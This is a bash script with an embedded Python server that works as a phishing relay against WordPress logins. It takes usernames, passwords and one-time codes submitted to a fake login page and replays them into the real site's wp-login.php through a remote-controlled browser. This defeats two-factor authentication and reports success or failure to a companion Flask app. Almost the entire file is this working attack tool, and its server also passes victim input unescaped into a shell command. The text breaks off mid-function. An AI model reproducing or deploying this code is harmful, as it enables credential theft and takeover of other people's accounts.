#!/bin/bash

# WordPress Login API Script using Python HTTP server
# This script waits for credentials via curl commands

# Parse command line arguments ONLY when script is run directly (not when functions are sourced)
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    DOMAIN=""
    while [[ $# -gt 0 ]]; do
        case $1 in
            --domain)
                DOMAIN="$2"
                shift 2
                ;;
            *)
                echo "❌ Unknown option: $1"
                echo "Usage: $0 --domain <domain>"
                echo "Example: $0 --domain your-domain.info"
                exit 1
                ;;
        esac
    done

    # Check if domain was provided
    if [ -z "$DOMAIN" ]; then
        echo "❌ Error: Domain is required"
        echo "Usage: $0 --domain <domain>"
        echo "Example: $0 --domain your-domain.info"
        exit 1
    fi
fi

# Only show header info when script is run directly
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    echo "🔐 WordPress Login API Server"
    echo "============================="
    echo "🌐 Target domain: $DOMAIN"
    echo ""
fi

# Load environment variables
if [ -f ~/.env ]; then
    source ~/.env
else
    echo "❌ Warning: ~/.env file not found. VNC password may not be available."
fi

# Set VNC password from environment or use default
VNC_PASSWORD=${VNC_PASSWORD:-"defaultpassword"}
PUBLIC_IP=${PUBLIC_IP:-$(curl -s ifconfig.me 2>/dev/null || curl -s ipinfo.io/ip 2>/dev/null || echo "127.0.0.1")}

# Only show VNC URL and prompt when script is run directly (not when functions are sourced)
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    # Show VNC URL immediately
    echo -e "🌐VNC URL: \033[1;33mhttp://$PUBLIC_IP:6901/?password=$VNC_PASSWORD\033[0m"
    echo ""
    echo -e "\033[1;31m⚠  IMPORTANT: Open the VNC URL above in your browser NOW!\033[0m"
    echo "📺 You need to have the VNC session open to monitor the login process."
    echo "🔍 Keep this browser tab open during the entire login sequence."
    echo ""
    echo -e "\033[1;33m📋 Please open the VNC URL in your browser, then press Enter to continue...\033[0m"
    read -p "Press Enter when VNC is loaded and ready: " -r
fi

# Global variables
SCRIPT_DIR="/tmp/wp_login"
PORT=8080

# Create working directory and save domain (only when run directly)
mkdir -p "$SCRIPT_DIR"

# Save domain to file so Python server can access it (only when script is run directly)
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    echo "$DOMAIN" > "$SCRIPT_DIR/domain"
fi

# Function to initialize browser session immediately
initialize_browser() {
    local domain="$1"
    
    echo "🚀 Initializing browser session..."
    echo "🌐 Loading $domain login page..."
    
    # Step 1: Create a headless session and navigate to login page
    SESSION_RESPONSE=$(curl -s -X POST http://127.0.0.1:5002/start \
      -H "Content-Type: application/json" \
      -d "{\"url\": \"https://$domain/wp-login.php\"}")
    
    if [ $? -ne 0 ]; then
        echo "❌ Error: Could not connect to Selenium server on port 5002"
        echo "🔧 Please ensure the Selenium server is running"
        echo "selenium_error" > "$SCRIPT_DIR/status"
        return 1
    fi
    
    echo "✅ Session created:"
    echo "$SESSION_RESPONSE" | jq .

    # Extract session ID
    SESSION_ID=$(echo "$SESSION_RESPONSE" | jq -r '.session_id')
    echo "$SESSION_ID" > "$SCRIPT_DIR/session_id"

    # Step 2: Wait for page to load
    echo "⏳ Waiting for page to load..."
    sleep 3

    # Step 3: Make session visible
    echo "🖥 Making session visible..."
    curl -s -X POST http://127.0.0.1:5002/takeover \
      -H "Content-Type: application/json" \
      -d "{\"session_id\": \"$SESSION_ID\"}" | jq .

    # Step 4: Click on username field to focus it
    echo "👤 Focusing username field..."
    curl -s -X POST http://127.0.0.1:5002/command \
      -H "Content-Type: application/json" \
      -d "{
        \"session_id\": \"$SESSION_ID\",
        \"action\": \"click\",
        \"selector\": \"#user_login\"
      }" | jq .

    echo ""
    echo "✅ Browser ready! Login page loaded and username field focused."
    echo "🌐 VNC URL: http://$PUBLIC_IP:6901/?password=$VNC_PASSWORD"
    echo "⏳ Waiting for login credentials..."
    echo "💡 Use: curl 'http://localhost:8080/start-login?username=USER&password=PASS'"
    echo ""
    echo "waiting_credentials" > "$SCRIPT_DIR/status"
}

# Enhanced function to check for MFA and login errors
check_for_mfa() {
    echo "🔍 Checking for MFA form elements and login errors..."
    MFA_DETECTED=false
    LOGIN_ERROR=false

    # Read session ID
    SESSION_ID=$(cat "$SCRIPT_DIR/session_id" 2>/dev/null)
    
    # First, check for login errors
    echo "   Checking for login error messages..."
    
    # Common WordPress error selectors and text patterns
    ERROR_SELECTORS=(
        "#login_error"
        ".wp-login-error" 
        "#loginform .error"
        ".login-error"
        "[class*='error']"
        "[id*='error']"
    )
    
    for selector in "${ERROR_SELECTORS[@]}"; do
        ERROR_RESPONSE=$(curl -s -X POST http://127.0.0.1:5002/command \
          -H "Content-Type: application/json" \
          -d "{
            \"session_id\": \"$SESSION_ID\",
            \"action\": \"click\",
            \"selector\": \"$selector\"
          }" 2>/dev/null)
        
        if echo "$ERROR_RESPONSE" | grep -q "success.*true"; then
            echo "   ❌ Found login error element: $selector"
            LOGIN_ERROR=true
            break
        fi
    done
    
    # Also check for common error text in the page
    if [ "$LOGIN_ERROR" = false ]; then
        echo "   Checking for error text patterns..."
        ERROR_TEXTS=(
            "Invalid username"
            "Invalid password" 
            "Unknown username"
            "The password you entered"
            "incorrect"
            "invalid"
            "ERROR"
        )
        
        for error_text in "${ERROR_TEXTS[@]}"; do
            TEXT_CHECK=$(curl -s -X POST http://127.0.0.1:5002/command \
              -H "Content-Type: application/json" \
              -d "{
                \"session_id\": \"$SESSION_ID\",
                \"action\": \"check_text\",
                \"text\": \"$error_text\"
              }" 2>/dev/null)
            
            if echo "$TEXT_CHECK" | grep -q "success.*true"; then
                echo "   ❌ Found error text: $error_text"
                LOGIN_ERROR=true
                break
            fi
        done
    fi
    
    # If login error detected, return early
    if [ "$LOGIN_ERROR" = true ]; then
        echo "🚨 Login error detected - credentials were incorrect"
        return 2  # Special return code for login error
    fi
    
    # No login error detected, now check for MFA elements FIRST (before URL analysis)
    echo "   ✅ No login errors found, checking for MFA elements..."
    
    # Check for mo2f digit inputs
    echo "   Checking for mo2f digit inputs..."
    MFA_RESPONSE1=$(curl -s -X POST http://127.0.0.1:5002/command \
      -H "Content-Type: application/json" \
      -d "{
        \"session_id\": \"$SESSION_ID\",
        \"action\": \"click\",
        \"selector\": \"#mo2f-digit-1\"
      }" 2>/dev/null)

    if echo "$MFA_RESPONSE1" | grep -q "success.*true"; then
        echo "   ✅ Found mo2f digit inputs!"
        MFA_DETECTED=true
        MFA_TYPE="mo2f"
        return 0
    fi

    # Check for generic single-digit inputs if mo2f not found
    echo "   Checking for generic MFA inputs..."
    for selector in "input[maxlength='1']" "input[type='text']:first" ".otp-input" ".digit-input" "input[name*='otp']" "input[name*='code']"; do
        MFA_RESPONSE=$(curl -s -X POST http://127.0.0.1:5002/command \
          -H "Content-Type: application/json" \
          -d "{
            \"session_id\": \"$SESSION_ID\",
            \"action\": \"click\",
            \"selector\": \"$selector\"
          }" 2>/dev/null)
        
        if echo "$MFA_RESPONSE" | grep -q "success.*true"; then
            echo "   ✅ Found MFA input with selector: $selector"
            MFA_DETECTED=true
            MFA_TYPE="generic"
            MFA_SELECTOR="$selector"
            return 0
        fi
    done

    # Check for validate/submit buttons that might indicate MFA
    echo "   Checking for MFA-related buttons..."
    for button_text in "validate" "verify" "submit" "confirm"; do
        BUTTON_RESPONSE=$(curl -s -X POST http://127.0.0.1:5002/command \
          -H "Content-Type: application/json" \
          -d "{
            \"session_id\": \"$SESSION_ID\",
            \"action\": \"click\",
            \"selector\": \"button:contains('$button_text'), input[value*='$button_text']\"
          }" 2>/dev/null)
        
        if echo "$BUTTON_RESPONSE" | grep -q "success.*true"; then
            echo "   ✅ Found MFA-related button: $button_text"
            MFA_DETECTED=true
            MFA_TYPE="button_detected"
            return 0
        fi
    done
    
    # No MFA elements found, now analyze URL and page state to determine success vs failure
    echo "   No MFA elements found, analyzing page state..."
    
    # Get current URL for analysis
    CURRENT_URL_RESPONSE=$(curl -s -X POST http://127.0.0.1:5002/command \
      -H "Content-Type: application/json" \
      -d "{
        \"session_id\": \"$SESSION_ID\",
        \"action\": \"get_url\"
      }")
    
    CURRENT_URL=$(echo "$CURRENT_URL_RESPONSE" | jq -r '.current_url // ""')
    echo "   🌐 Current URL: $CURRENT_URL"
    
    # Check if we successfully logged in (redirected to admin area) - enhanced URL checking
    if [[ "$CURRENT_URL" == *"/wp-admin"* ]] || [[ "$CURRENT_URL" == *"dashboard"* ]] || [[ "$CURRENT_URL" == *"profile"* ]] || [[ "$CURRENT_URL" == *"admin"* ]]; then
        echo "   ✅ Successfully logged in without MFA (redirected to admin area: $CURRENT_URL)"
        return 1  # Special return code for successful login without MFA
    fi
    
    # Check if we're still on wp-login.php (might indicate failure)
    if [[ "$CURRENT_URL" == *"wp-login.php"* ]]; then
        echo "   🔍 Still on wp-login.php, checking if this is a failed login..."
        
        # Check if login form is still present (indicates failed login)
        FORM_STILL_PRESENT=$(curl -s -X POST http://127.0.0.1:5002/command \
          -H "Content-Type: application/json" \
          -d "{
            \"session_id\": \"$SESSION_ID\",
            \"action\": \"click\",
            \"selector\": \"#loginform\"
          }" 2>/dev/null)
        
        if echo "$FORM_STILL_PRESENT" | grep -q "success.*true"; then
            echo "   ❌ Still on login page with login form present - likely failed login"
            return 2  # Login error
        else
            echo "   🤔 On wp-login.php but no login form - unusual state"
            return 3  # Unclear status
        fi
    fi
    
    # If we're not on wp-login.php and not on admin pages, check what page we're on
    if [ -n "$CURRENT_URL" ] && [[ "$CURRENT_URL" != *"wp-login.php"* ]]; then
        echo "   ✅ Redirected away from login page to: $CURRENT_URL"
        echo "   This likely indicates successful login without MFA"
        return 1  # Successful login without MFA
    fi
    
    # If URL is empty, use fallback detection methods
    if [ -z "$CURRENT_URL" ]; then
        echo "   ⚠  Could not get current URL, using fallback detection methods..."
        
        # Method 1: Check if login form is still present
        FORM_CHECK=$(curl -s -X POST http://127.0.0.1:5002/command \
          -H "Content-Type: application/json" \
          -d "{
            \"session_id\": \"$SESSION_ID\",
            \"action\": \"click\",
            \"selector\": \"#loginform\"
          }" 2>/dev/null)
        
        if echo "$FORM_CHECK" | grep -q "success.*true"; then
            echo "   ❌ Login form still present - likely failed login or still on login page"
            
            # Double-check if it's the wp-login.php page by looking for WordPress login elements
            WP_LOGIN_CHECK=$(curl -s -X POST http://127.0.0.1:5002/command \
              -H "Content-Type: application/json" \
              -d "{
                \"session_id\": \"$SESSION_ID\",
                \"action\": \"click\",
                \"selector\": \"#user_login\"
              }" 2>/dev/null)
            
            if echo "$WP_LOGIN_CHECK" | grep -q "success.*true"; then
                echo "   ❌ Still on wp-login page - this appears to be a failed login"
                return 2  # Login error
            else
                echo "   ❓ Login form present but not standard wp-login page - unclear state"
                return 3  # Unclear status
            fi
        else
            echo "   ✅ Login form no longer present - likely successful login"
            
            # Additional verification: check for common admin page elements
            ADMIN_CHECK=$(curl -s -X POST http://127.0.0.1:5002/command \
              -H "Content-Type: application/json" \
              -d "{
                \"session_id\": \"$SESSION_ID\",
                \"action\": \"click\",
                \"selector\": \"#wpadminbar, .wp-admin, #adminmenu\"
              }" 2>/dev/null)
                
            if echo "$ADMIN_CHECK" | grep -q "success.*true"; then
                echo "   ✅ Found admin page elements - confirmed successful login"
                return 1  # Successful login without MFA
            else
                echo "   ❓ No login form and no admin elements - might be redirected to unknown page"
                return 3  # Unclear status - be conservative
            fi
        fi
    fi
    
    # If we reach here, status is unclear
    echo "   ⚠  Status unclear - no errors, no MFA, no clear success indicators"
    return 3  # Unclear status
}

# Updated function to start the login process
start_login() {
    local user="$1"
    local pass="$2"
    
    # Read session ID from file
    SESSION_ID=$(cat "$SCRIPT_DIR/session_id" 2>/dev/null)
    if [ -z "$SESSION_ID" ]; then
        echo "❌ Error: No browser session found. Please restart the script."
        return 1
    fi
    
    # Read domain from file
    local domain=$(cat "$SCRIPT_DIR/domain" 2>/dev/null)
    if [ -z "$domain" ]; then
        echo "❌ Error: Domain not found. Please restart the script with --domain argument."
        return 1
    fi
    
    echo "✅ Received credentials for user: $user"
    echo "🚀 Processing login for domain: $domain"
    echo "logging_in" > "$SCRIPT_DIR/status"
    echo ""
    
    USERNAME="$user"
    PASSWORD="$pass"
    
    # Clear username field and enter new username
    echo "👤 Entering username..."
    curl -s -X POST http://127.0.0.1:5002/command \
      -H "Content-Type: application/json" \
      -d "{
        \"session_id\": \"$SESSION_ID\",
        \"action\": \"clear\",
        \"selector\": \"#user_login\"
      }" > /dev/null

    curl -s -X POST http://127.0.0.1:5002/command \
      -H "Content-Type: application/json" \
      -d "{
        \"session_id\": \"$SESSION_ID\",
        \"action\": \"type\",
        \"selector\": \"#user_login\",
        \"text\": \"$USERNAME\"
      }" | jq .

    echo "⏳ Waiting 1 second before password..."
    sleep 1

    # Fill in password
    echo "🔐 Entering password..."
    curl -s -X POST http://127.0.0.1:5002/command \
      -H "Content-Type: application/json" \
      -d "{
        \"session_id\": \"$SESSION_ID\",
        \"action\": \"click\",
        \"selector\": \"#user_pass\"
      }" | jq .

    sleep 0.5

    curl -s -X POST http://127.0.0.1:5002/command \
      -H "Content-Type: application/json" \
      -d "{
        \"session_id\": \"$SESSION_ID\",
        \"action\": \"type\",
        \"selector\": \"#user_pass\",
        \"text\": \"$PASSWORD\"
      }" | jq .

    echo "⏳ Waiting 1 second before submitting..."
    sleep 1

    # Submit the form
    echo "📝 Submitting login form..."
    curl -s -X POST http://127.0.0.1:5002/command \
      -H "Content-Type: application/json" \
      -d "{
        \"session_id\": \"$SESSION_ID\",
        \"action\": \"click\",
        \"selector\": \"#wp-submit\"
      }" | jq .

    # Wait for login to process and check for MFA/errors
    echo "⏳ Waiting for login to process..."
    sleep 5

    # Check for MFA/errors - now with enhanced error detection
    check_for_mfa
    CHECK_RESULT=$?
    
    case $CHECK_RESULT in
        0)
            # MFA detected
            echo "🎯 MFA form detected (type: $MFA_TYPE)!"
            echo "📧 Waiting for OTP code..."
            echo "🌐 VNC URL: http://$PUBLIC_IP:6901/?password=$VNC_PASSWORD"
            echo "mfa_detected" > "$SCRIPT_DIR/status"
            echo "$MFA_TYPE" > "$SCRIPT_DIR/mfa_type"
            echo "$MFA_SELECTOR" > "$SCRIPT_DIR/mfa_selector"
            
            # Notify Flask app that MFA is required
            echo "📡 Notifying Flask app: MFA required"
            curl -s -X POST "http://localhost:5000/mfa_status" \
              -d "mfa_required=true" \
              -H "Content-Type: application/x-www-form-urlencoded" > /dev/null 2>&1
            
            return 0
            ;;
        1)
            # Successful login without MFA
            echo "✅ Login successful without MFA!"
            echo "🔍 User was logged in successfully to the admin area"
            
            # Notify Flask app that MFA is NOT required (successful login)
            echo "📡 Notifying Flask app: Login successful, no MFA required"
            curl -s -X POST "http://localhost:5000/mfa_status" \
              -d "mfa_required=false" \
              -H "Content-Type: application/x-www-form-urlencoded" > /dev/null 2>&1
            
            echo "🌐 VNC URL: http://$PUBLIC_IP:6901/?password=$VNC_PASSWORD"
            echo "login_successful" > "$SCRIPT_DIR/status"
            return 0
            ;;
        2)
            # Login error detected
            echo "🚨 Login failed - incorrect username/password!"
            echo "❌ The credentials provided were invalid"
            echo "🔄 User should remain on the fake login page"
            
            # Notify Flask app that login failed - DO NOT grant access
            echo "📡 Notifying Flask app: Login failed, credentials invalid"
            curl -s -X POST "http://localhost:5000/mfa_status" \
              -d "mfa_required=login_failed" \
              -H "Content-Type: application/x-www-form-urlencoded" > /dev/null 2>&1
            
            echo "🌐 VNC URL: http://$PUBLIC_IP:6901/?password=$VNC_PASSWORD"
            echo "login_failed" > "$SCRIPT_DIR/status"
            return 2
            ;;
        3)
            # Unclear status
            echo "⚠  Login status unclear"
            echo "🔍 No clear success, error, or MFA indicators found"
            echo "📋 This might indicate:"
            echo "   - Page is still loading"
            echo "   - Unusual login flow"
            echo "   - Unexpected page structure"
            
            # Be conservative - don't grant access if status is unclear
            echo "📡 Notifying Flask app: Status unclear, not granting access"
            curl -s -X POST "http://localhost:5000/mfa_status" \
              -d "mfa_required=status_unclear" \
              -H "Content-Type: application/x-www-form-urlencoded" > /dev/null 2>&1
            
            echo "🔍 Please check the VNC to see the current page status"
            echo "🌐 VNC URL: http://$PUBLIC_IP:6901/?password=$VNC_PASSWORD"
            echo "status_unclear" > "$SCRIPT_DIR/status"
            return 3
            ;;
        *)
            # Unexpected return code
            echo "❌ Unexpected error in MFA check (return code: $CHECK_RESULT)"
            echo "status_error" > "$SCRIPT_DIR/status"
            return 1
            ;;
    esac
}

# Function to submit OTP
submit_otp() {
    local otp="$1"
    
    # Reset status at the beginning of each OTP attempt
    echo "otp_processing" > "$SCRIPT_DIR/status"
    
    if [[ ${#otp} -ne 6 || ! "$otp" =~ ^[0-9]+$ ]]; then
        echo "❌ Invalid OTP format. Must be exactly 6 digits."
        
        # Notify Flask app that OTP format is invalid
        curl -s -X POST "http://localhost:5000/otp_status" \
          -d "otp_valid=false" \
          -H "Content-Type: application/x-www-form-urlencoded" > /dev/null 2>&1
        
        return 1
    fi
    
    echo "✅ Received valid OTP: $otp"
    echo "🔢 Attempting to enter OTP code..."
    
    # Read session variables from files
    SESSION_ID=$(cat "$SCRIPT_DIR/session_id" 2>/dev/null)
    MFA_TYPE=$(cat "$SCRIPT_DIR/mfa_type" 2>/dev/null)
    MFA_SELECTOR=$(cat "$SCRIPT_DIR/mfa_selector" 2>/dev/null)
    
    if [ -z "$SESSION_ID" ]; then
        echo "❌ No active session found. Please start login first."
        
        # Notify Flask app that no session was found
        curl -s -X POST "http://localhost:5000/otp_status" \
          -d "otp_valid=false" \
          -H "Content-Type: application/x-www-form-urlencoded" > /dev/null 2>&1
        
        return 1
    fi
    
    if [ "$MFA_TYPE" = "mo2f" ]; then
        # Clear and fill mo2f digit boxes
        echo "🔢 Clearing and filling mo2f digit boxes..."
        for i in {1..6}; do
            # Clear the field first
            curl -s -X POST http://127.0.0.1:5002/command \
              -H "Content-Type: application/json" \
              -d "{
                \"session_id\": \"$SESSION_ID\",
                \"action\": \"clear\",
                \"selector\": \"#mo2f-digit-$i\"
              }" > /dev/null
            sleep 0.1
            
            # Enter the new digit
            digit=${otp:$((i-1)):1}
            curl -s -X POST http://127.0.0.1:5002/command \
              -H "Content-Type: application/json" \
              -d "{
                \"session_id\": \"$SESSION_ID\",
                \"action\": \"type\",
                \"selector\": \"#mo2f-digit-$i\",
                \"text\": \"$digit\"
              }" > /dev/null
            sleep 0.2
        done
        
        # Try to click validate button
        echo "🚀 Clicking validate button..."
        SUBMIT_RESPONSE=$(curl -s -X POST http://127.0.0.1:5002/command \
          -H "Content-Type: application/json" \
          -d "{
            \"session_id\": \"$SESSION_ID\",
            \"action\": \"click\",
            \"selector\": \"#mo2f_catchy_validate\"
          }")
    
    else
        # Try generic approach
        echo "🔢 Attempting to fill OTP code using generic method..."
        
        # Clear and fill the input field
        if [ "$MFA_TYPE" = "generic" ] && [ -n "$MFA_SELECTOR" ]; then
            # Clear the field first
            curl -s -X POST http://127.0.0.1:5002/command \
              -H "Content-Type: application/json" \
              -d "{
                \"session_id\": \"$SESSION_ID\",
                \"action\": \"clear\",
                \"selector\": \"$MFA_SELECTOR\"
              }" > /dev/null
            sleep 0.5
            
            # Enter the new OTP
            curl -s -X POST http://127.0.0.1:5002/command \
              -H "Content-Type: application/json" \
              -d "{
                \"session_id\": \"$SESSION_ID\",
                \"action\": \"type\",
                \"selector\": \"$MFA_SELECTOR\",
                \"text\": \"$otp\"
              }" > /dev/null
        fi
        
        # Try to submit by pressing Enter
        echo "⌨ Pressing Enter to submit..."
        curl -s -X POST http://127.0.0.1:5002/command \
          -H "Content-Type: application/json" \
          -d "{
            \"session_id\": \"$SESSION_ID\",
            \"action\": \"key\",
            \"key\": \"Return\"
          }" > /dev/null
        
        # Also try clicking common submit button selectors
        for selector in "button[type='submit']" "input[type='submit']" ".validate-btn" ".submit-btn"; do
            curl -s -X POST http://127.0.0.1:5002/command \
              -H "Content-Type: application/json" \
              -d "{
                \"session_id\": \"$SESSION_ID\",
                \"action\": \"click\",
                \"selector\": \"$selector\"
              }" > /dev/null 2>&1
        done
    fi
    
    echo "⏳ Waiting for OTP validation..."
    sleep 8
    
    # Check if OTP validation was successful by examining the page
    echo "🔍 Checking OTP validation result..."
    
    # Get current URL to check if we were redirected (success) or stayed on MFA page (failure)
    CURRENT_URL_RESPONSE=$(curl -s -X POST http://127.0.0.1:5002/command \
      -H "Content-Type: application/json" \
      -d "{
        \"session_id\": \"$SESSION_ID\",
        \"action\": \"get_url\"
      }")
    
    CURRENT_URL=$(echo "$CURRENT_URL_RESPONSE" | jq -r '.current_url // ""')
    echo "🌐 Current URL after OTP submission: $CURRENT_URL"
    
    # Check for success indicators - be more strict about success detection
    OTP_SUCCESS=false
    
    # Method 1: Check if URL clearly indicates success (admin pages)
    if [[ -n "$CURRENT_URL" && ( "$CURRENT_URL" == *"/wp-admin"* || "$CURRENT_URL" == *"dashboard"* || "$CURRENT_URL" == *"profile"* ) ]]; then
        echo "   ✅ URL clearly indicates successful login (admin page): $CURRENT_URL"
        OTP_SUCCESS=true
    fi
    
    # Method 2: If we can't get URL or it's not clearly an admin page, check for MFA elements
    if [ "$OTP_SUCCESS" = false ]; then
        echo "   Checking if still on MFA page by looking for MFA elements..."
        
        # Check if mo2f elements are still present (means we're still on MFA page - failure)
        MFA_STILL_PRESENT=$(curl -s -X POST http://127.0.0.1:5002/command \
          -H "Content-Type: application/json" \
          -d "{
            \"session_id\": \"$SESSION_ID\",
            \"action\": \"click\",
            \"selector\": \"#mo2f-digit-1\"
          }" 2>/dev/null)
        
        if echo "$MFA_STILL_PRESENT" | grep -q "success.*true"; then
            echo "   ❌ MFA elements still present - OTP validation failed"
            OTP_SUCCESS=false
        else
            # No MFA elements found - check for error messages to be sure
            echo "   No MFA elements found, checking for error messages..."
            
            ERROR_FOUND=false
            for error_selector in ".error" ".invalid" ".wrong" ".incorrect" "[class*='error']" "[id*='error']"; do
                ERROR_CHECK=$(curl -s -X POST http://127.0.0.1:5002/command \
                  -H "Content-Type: application/json" \
                  -d "{
                    \"session_id\": \"$SESSION_ID\",
                    \"action\": \"click\",
                    \"selector\": \"$error_selector\"
                  }" 2>/dev/null)
                
                if echo "$ERROR_CHECK" | grep -q "success.*true"; then
                    echo "   ❌ Found error message - OTP validation failed"
                    ERROR_FOUND=true
                    OTP_SUCCESS=false
                    break
                fi
            done
            
            # If no MFA elements and no error messages, check for admin page elements
            if [ "$ERROR_FOUND" = false ]; then
                echo "   No errors found, checking for admin page elements..."
                
                ADMIN_ELEMENTS=$(curl -s -X POST http://127.0.0.1:5002/command \
                  -H "Content-Type: application/json" \
                  -d "{
                    \"session_id\": \"$SESSION_ID\",
                    \"action\": \"click\",
                    \"selector\": \"#wpadminbar, .wp-admin, #adminmenu, body.wp-admin\"
                  }" 2>/dev/null)
                
                if echo "$ADMIN_ELEMENTS" | grep -q "success.*true"; then
                    echo "   ✅ Found admin page elements - OTP validation successful"
                    OTP_SUCCESS=true
                else
                    echo "   ❌ No admin elements found - assuming OTP validation failed"
                    OTP_SUCCESS=false
                fi
            fi
        fi
    fi
    
    # Notify Flask app of the validation result
    if [ "$OTP_SUCCESS" = true ]; then
        echo "📡 Notifying Flask app: OTP validation successful"
        curl -s -X POST "http://localhost:5000/otp_status" \
          -d "otp_valid=true" \
          -H "Content-Type: application/x-www-form-urlencoded" > /dev/null 2>&1
        
        echo "✅ OTP validation successful!"
        echo "🔍 Please check the VNC to confirm login was successful"
        echo "🌐 VNC URL: http://$PUBLIC_IP:6901/?password=$VNC_PASSWORD"
        echo "otp_validated_success" > "$SCRIPT_DIR/status"
    else
        echo "📡 Notifying Flask app: OTP validation failed"
        curl -s -X POST "http://localhost:5000/otp_status" \
          -d "otp_valid=false" \
          -H "Content-Type: application/x-www-form-urlencoded" > /dev/null 2>&1
        
        echo "❌ OTP validation failed!"
        echo "🔍 Please check the VNC to see the current page status"
        echo "🌐 VNC URL: http://$PUBLIC_IP:6901/?password=$VNC_PASSWORD"
        echo "otp_validated_failure" > "$SCRIPT_DIR/status"
    fi
}

# Export functions so they can be called from Python
export -f start_login
export -f check_for_mfa
export -f submit_otp
export -f initialize_browser

create_python_server() {
    cat > "$SCRIPT_DIR/server.py" << 'EOF'
#!/usr/bin/env python3
import http.server
import socketserver
import urllib.parse
import json
import subprocess
import os
import sys
from threading import Thread

PORT = 8080
SCRIPT_DIR = "/tmp/wp_login"

class RequestHandler(http.server.BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        # Suppress default logging
        pass
        
    def do_GET(self):
        self.handle_request()
    
    def do_POST(self):
        self.handle_request()
    
    def handle_request(self):
        # Parse URL
        parsed_url = urllib.parse.urlparse(self.path)
        path = parsed_url.path
        query_params = urllib.parse.parse_qs(parsed_url.query)
        
        print(f"📡 Request: {self.command} {path}")
        
        # Read current status for debugging
        status_file = os.path.join(SCRIPT_DIR, "status")
        current_status = "unknown"
        if os.path.exists(status_file):
            with open(status_file, 'r') as f:
                current_status = f.read().strip()
        print(f"🔍 Current status: {current_status}")
        
        # Set common headers
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        
        if path == '/start-login':
            username = query_params.get('username', [''])[0]
            password = query_params.get('password', [''])[0]
            
            if username and password:
                response = {
                    "status": "starting_login", 
                    "message": "Login process initiated", 
                    "username": username
                }
                self.wfile.write(json.dumps(response).encode())
                
                # Start login process in background
                def run_login():
                    # Get the actual script path - look for wordpress-relay.sh in current directory and parent directories
                    current_dir = os.getcwd()
                    script_path = None
                    
                    # Check current directory first
                    if os.path.exists(os.path.join(current_dir, "wordpress-relay.sh")):
                        script_path = os.path.join(current_dir, "wordpress-relay.sh")
                    else:
                        # Check parent directories
                        parent_dir = os.path.dirname(current_dir)
                        if os.path.exists(os.path.join(parent_dir, "wordpress-relay.sh")):
                            script_path = os.path.join(parent_dir, "wordpress-relay.sh")
                        else:
                            # Check root directory
                            if os.path.exists("/root/wordpress-relay.sh"):
                                script_path = "/root/wordpress-relay.sh"
                    
                    if script_path:
                        subprocess.run(["/bin/bash", "-c", f'source "{script_path}"; start_login "{username}" "{password}"'])
                    else:
                        print("❌ Could not find wordpress-relay.sh script")
                
                Thread(target=run_login, daemon=True).start()
                
            else:
                response = {"status": "error", "message": "Missing username or password parameters"}
                self.wfile.write(json.dumps(response).encode())
                
        elif path == '/submit-otp':
            otp = query_params.get('otp', [''])[0]
            
            if otp:
                # Check if we have an active session using the correct SCRIPT_DIR path
                session_file = os.path.join(SCRIPT_DIR, "session_id")
                status_file = os.path.join(SCRIPT_DIR, "status")
                
                print(f"🔍 Checking for session file: {session_file}")
                print(f"🔍 Checking for status file: {status_file}")
                print(f"🔍 Session file exists: {os.path.exists(session_file)}")
                print(f"🔍 Status file exists: {os.path.exists(status_file)}")
                
                if os.path.exists(session_file) and os.path.exists(status_file):
                    with open(status_file, 'r') as f:
                        status = f.read().strip()
                    
                    print(f"🔍 Current status: {status}")
                    
                    if status in ["mfa_detected", "browser_ready", "waiting_credentials", "otp_validated_failure"]:
                        response = {
                            "status": "submitting_otp", 
                            "message": "OTP submission initiated", 
                            "otp": otp
                        }
                        self.wfile.write(json.dumps(response).encode())
                        
                        # Submit OTP in background
                        def run_otp():
                            # Get the actual script path - look for wordpress-relay.sh in current directory and parent directories
                            current_dir = os.getcwd()
                            script_path = None
                            
                            # Check current directory first
                            if os.path.exists(os.path.join(current_dir, "wordpress-relay.sh")):
                                script_path = os.path.join(current_dir, "wordpress-relay.sh")
                            else:
                                # Check parent directories
                                parent_dir = os.path.dirname(current_dir)
                                if os.path.exists(os.path.join(parent_dir, "wordpress-relay.sh")):
                                    script_path = os.path.join(parent_dir, "wordpress-relay.sh")
                                else:
                                    # Check root directory
                                    if os.path.exists("/root/wordpress-relay.sh"):
                                        script_path = "/root/wordpress-relay.sh"
                            
                            if script_path:
                                print(f"🔧 Using script: {script_path}")
                                subprocess.run(["/bin/bash", "-c", f'source "{script_path}"; submit_otp "{otp}"'])
                            else:
                                print("❌ Could not find wordpress-relay.sh script")
                        
                        Thread(target=run_otp, daemon=True).start()
                        
                    else:
                        response = {"status": "error", "message": f"No MFA session active. Current status: {status}"}
                        self.wfile.write(json.dumps(response).encode())
                else:
                    response = {"status": "error", "message": "No active session found. Please start login first."}
                    self.wfile.write(json.dumps(response).encode())
            else:
                response = {"status": "error", "message": "Missing otp parameter"}
                self.wfile.write(json.dumps(response).encode())
                
        elif path == '/status':
            session_id = ""
            status = "waiting"
            mfa_type = ""
            domain = ""
            
            session_file = os.path.join(SCRIPT_DIR, "session_id")
            status_file = os.path.join(SCRIPT_DIR, "status")
            mfa_file = os.path.join(SCRIPT_DIR, "mfa_type")
            domain_file = os.path.join(SCRIPT_DIR, "domain")
            
            if os.path.exists(session_file):
                with open(session_file, 'r') as f:
                    session_id = f.read().strip()
            
            if os.path.exists(status_file):
                with open(status_file, 'r') as f:
                    status = f.read().strip()
                    
            if os.path.exists(mfa_file):
                with open(mfa_file, 'r') as f:
                    mfa_type = f.read().strip()
            
            if os.path.exists(domain_file):
                with open(domain_file, 'r') as f:
                    domain = f.read().strip()
            
            response = {
                "status": status,
                "session_id": session_id,
                "mfa_type": mfa_type,
                "domain": domain,
                "vnc_url": f"http://{os.getenv('PUBLIC_IP', '127.0.0.1')}:6901/?password={os.getenv('VNC_PASSWORD', 'defaultpassword')}"
            }
            self.wfile.write(json.dumps(response).encode())
            
        else:
            response = {"status": "error", "message": "Endpoint not found"}
            self.send_response(404)
            self.wfile.write(json.dumps(response).encode())

def start_server():
    with socketserver.TCPServer(("", PORT), RequestHandler) as httpd:
        print(f"🌐 HTTP Server running on port {PORT}")
        print("📡 Available endpoints:")
        print("   - GET/POST /start-login?username=<user>&password=<pass>")
